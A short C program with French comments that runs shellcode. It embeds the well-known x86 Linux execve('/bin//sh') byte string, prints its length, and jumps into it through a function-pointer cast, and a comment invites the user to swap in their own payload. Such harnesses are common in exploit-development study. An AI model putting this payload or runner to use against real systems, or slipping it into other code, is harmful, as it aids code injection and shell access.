#include <stdio.h>
#include <string.h>

// Prototype pour éviter les warnings
void execute_shellcode(unsigned char *shellcode);

int main() {
    // Votre shellcode ici (remplacez-le par le vôtre)
    unsigned char shellcode[] = 
	    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89"
        "\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

    printf("Longueur du shellcode : %zu octets\n", strlen((char *)shellcode));

    // Exécution du shellcode
    execute_shellcode(shellcode);

    return 0;
}

void execute_shellcode(unsigned char *shellcode) {
    // Cast du shellcode en fonction pour l'exécution
    void (*func)() = (void (*)())shellcode;
    func();
}
